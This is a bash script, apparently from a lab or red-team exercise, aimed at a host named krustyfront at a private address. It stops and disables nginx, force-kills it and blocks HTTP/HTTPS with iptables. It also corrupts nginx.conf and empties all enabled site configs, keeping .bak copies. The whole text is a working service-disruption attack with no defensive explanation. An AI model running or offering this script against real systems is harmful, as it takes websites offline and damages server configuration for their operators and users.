#!/bin/bash
# krustyfront (10.111.1.5) - Nginx disruption

systemctl stop nginx 2>/dev/null
systemctl disable nginx 2>/dev/null

pkill -9 nginx 2>/dev/null

# Block HTTP/HTTPS
iptables -I INPUT -p tcp --dport 80  -j DROP
iptables -I INPUT -p tcp --dport 443 -j DROP

# Break the config with a backup
if [ -f /etc/nginx/nginx.conf ]; then
    cp /etc/nginx/nginx.conf /etc/nginx/nginx.conf.bak
    echo "INVALID {" >> /etc/nginx/nginx.conf
fi

# Also nuke enabled site configs
for f in /etc/nginx/sites-enabled/*; do
    [ -f "$f" ] && cp "$f" "${f}.bak" && echo "" > "$f"
done

echo "[*] Nginx disruption complete on krustyfront"
